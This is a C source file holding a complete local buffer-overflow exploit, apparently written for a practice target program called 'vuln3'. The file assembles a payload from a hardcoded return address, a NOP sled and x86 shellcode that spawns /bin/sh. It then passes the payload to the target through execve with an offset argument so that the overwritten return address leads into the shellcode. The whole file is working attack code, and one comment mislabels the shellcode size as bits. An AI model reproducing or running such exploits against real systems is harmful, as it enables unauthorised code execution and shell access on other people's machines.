#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define NOP 0x90

// shellcode 45 bits
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
  "\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc"
  "\xff\xff\xff/bin/sh";
  // the return address to NOP
char ret[]="\xec\xfd\xff\xbf";

int main() {

char *name[4];
char code[109];
char *address;
int i;

// insert ret first
for(i=0; i<strlen(ret); i++)
	code[i]=ret[i];
for(i=0; i < 60; i++)
	code[i+4]=NOP;
// insert shellcode
for(i=0; i<strlen(shellcode); i++)
	code[i+64]=shellcode[i];

//printf("%d\n", strlen(code));
//printf("%d\n", strlen(ret));
//printf("%d\n", strlen(shellcode));
//printf("%s\n", code);
name[0] = "vuln3";
name[1] = code;
name[2] = "116";		// set offset, let pointer point to the ret
name[3] = NULL;
execve(name[0], name, NULL);
return 0;
}